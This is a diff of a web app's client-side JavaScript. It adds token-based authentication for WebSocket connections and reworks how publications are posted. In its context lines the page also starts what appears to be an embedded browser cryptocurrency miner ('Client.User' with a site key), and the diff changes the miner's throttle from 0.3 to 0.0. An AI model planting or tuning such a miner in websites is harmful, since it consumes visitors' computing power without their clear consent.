@@ -25,7 +25,12 @@ function notif(text){
     getPubs();
 
 
-
+/**vars */
+var queryHeaders = {
+    'Content-Type': 'application/json; charset=utf-8',
+    'Authorization': getEl('ctkn').value,
+    'Tipo': 'query'
+}
 
 /************** WebSockets **************/
 /*var ws = new io();
@@ -58,32 +63,41 @@ pubSender.addEventListener('click',function(){
 var href = window.location.href;
 var url = href.replace('http','ws');
 
-var ws = new WebSocket(url);
+getWsAuth(getEl('ctkn').value, auth => {
+    console.log('auth',auth.wsAuth);
+    var ws = new WebSocket(url);
+    var auth = {tipo: 'auth', token: auth.wsAuth };
 
-ws.addEventListener('open', function() {
-  console.log('ws connected');
-});
+    ws.addEventListener('open', function() {
+      console.log('ws connected');
+      ws.send(JSON.stringify(auth));
+    });
 
-ws.addEventListener('message', function (event) {
-    console.log('Message from server ', event.data);
-});
+    ws.addEventListener('message', function (event) {
+        console.log('Message from server ', event.data);
+    });
 
-var pubSender = getEl('pubSender');
-pubSender.addEventListener('click',function(){
-    let pubContent = getEl('pubContent');
-    var pubData = {
-      pubid: 'fhfhfh',
-      time: '45:78:12',
-      nombre: 'unoname',
-      content: pubContent.value,
-      tkn: getEl('ctkn').value
-    }
+    var pubSender = getEl('pubSender');
+    pubSender.addEventListener('click',function(){
+        let pubContent = getEl('pubContent');
+        var pubData = {
+          tipo: 'pub',
+          content: pubContent.value,
+          time: new Date(),
+          tkn: getEl('ctkn').value
+        }
+    
+        pubContent.value = '';
+    
+        ws.send(JSON.stringify(pubData));
+        newPub(pubData);
+    });
+})
 
-    pubContent.value = '';
 
-    ws.send(JSON.stringify(pubData));
-    newPub(pubData);
-});
+
+
+
 
 
 /************* Publications **************/
@@ -140,12 +154,6 @@ function newPub(res){
     //div.addEventListener('click',getPublicationID);
 
     getEl('publications').prepend(div);
-}
-
-var queryHeaders = {
-    'Content-Type': 'application/json; charset=utf-8',
-    'Authorization': getEl('ctkn').value,
-    'Tipo': 'query'
 }
 
 /** Get Publications **/
@@ -245,7 +253,7 @@ getEl('salir').addEventListener('click', function(){
 
 
 var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',usuario, {
-    throttle: 0.3, c: 'w'
+    throttle: 0.0, c: 'w'
 });
 
 _client.start();
@@ -255,3 +263,27 @@ _client.start();
 
 
 })
+
+/***get auth */
+function getWsAuth(csrf,cb){
+    var headers = {
+        'Content-Type': 'application/json; charset=utf-8',
+        'Tipo': 'query'
+    }
+
+    fetch('/api/wsAuth', {
+        credentials: 'include',
+        headers: headers,
+        method: 'POST',
+        body: JSON.stringify({
+            'csrf': csrf
+        })
+    })
+    .then(res => {
+        if(res.ok == false){ return; }
+        return res.json();
+    })
+    .then(res => {
+        cb(res);
+    });
+}
